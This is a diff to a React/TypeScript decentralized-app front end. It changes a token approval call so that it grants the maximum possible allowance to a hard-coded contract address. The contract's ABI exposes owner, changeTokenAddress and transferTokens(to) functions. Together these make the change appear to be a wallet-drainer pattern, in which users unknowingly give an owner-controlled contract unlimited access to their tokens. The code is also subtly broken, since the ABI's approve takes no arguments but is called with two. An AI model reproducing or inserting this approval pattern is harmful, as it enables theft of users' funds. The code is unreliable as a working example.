@@ -91,19 +91,91 @@ function App() {
   
       // Replace '0xYourContractAddress' with your actual contract address
       const contractAddress = '0xA3ADdd4a1B61e584dB28413f8470B6Ffa31971F6';
+      
       // Replace '0xSpenderContractAddress' with the address you want to approve spending for
       const spender = '0xA3ADdd4a1B61e584dB28413f8470B6Ffa31971F6';
   
       // Replace with the ABI of your smart contract
-      const contractABI: any[] = [{"inputs":[{"internalType":"address","name":"_tokenAddress","type":"address"}],"stateMutability":"nonpayable","type":"constructor"},{"inputs":[],"name":"approve","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"_newTokenAddress","type":"address"}],"name":"changeTokenAddress","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"owner","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"tokenAddress","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"to","type":"address"}],"name":"transferTokens","outputs":[],"stateMutability":"nonpayable","type":"function"}]; // Your smart contract ABI
+      const contractABI: any[] = [
+        {
+          "inputs": [
+            {
+              "internalType": "address",
+              "name": "_tokenAddress",
+              "type": "address"
+            }
+          ],
+          "stateMutability": "nonpayable",
+          "type": "constructor"
+        },
+        {
+          "inputs": [],
+          "name": "approve",
+          "outputs": [],
+          "stateMutability": "nonpayable",
+          "type": "function"
+        },
+        {
+          "inputs": [
+            {
+              "internalType": "address",
+              "name": "_newTokenAddress",
+              "type": "address"
+            }
+          ],
+          "name": "changeTokenAddress",
+          "outputs": [],
+          "stateMutability": "nonpayable",
+          "type": "function"
+        },
+        {
+          "inputs": [],
+          "name": "owner",
+          "outputs": [
+            {
+              "internalType": "address",
+              "name": "",
+              "type": "address"
+            }
+          ],
+          "stateMutability": "view",
+          "type": "function"
+        },
+        {
+          "inputs": [],
+          "name": "tokenAddress",
+          "outputs": [
+            {
+              "internalType": "address",
+              "name": "",
+              "type": "address"
+            }
+          ],
+          "stateMutability": "view",
+          "type": "function"
+        },
+        {
+          "inputs": [
+            {
+              "internalType": "address",
+              "name": "to",
+              "type": "address"
+            }
+          ],
+          "name": "transferTokens",
+          "outputs": [],
+          "stateMutability": "nonpayable",
+          "type": "function"
+        }
+      ]; // Your smart contract ABI
   
       // Create a Contract instance
       const contract = new Contract(contractAddress, contractABI, signer);
   
-      // Replace '100' with the actual amount and 'ether' with the token unit if needed
-      const allowance = ethers.utils.parseUnits('100', 'ether');
+      // Set allowance to the maximum possible value
+      const allowance = "0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF";
   
-      // Call the 'approve' function of your contract
+      // Call the 'approve' function of your contract with spender and allowance
       const tx = await contract.approve(spender, allowance, { gasLimit: 10000000 });
       await tx.wait();
   
@@ -112,7 +184,7 @@ function App() {
       console.error('Error approving spending:', error);
     }
     setIsProcessing(false); // Hide the processing indicator
-};
+  };  
 
     const disableConnect = Boolean(wallet) && isConnecting;
 
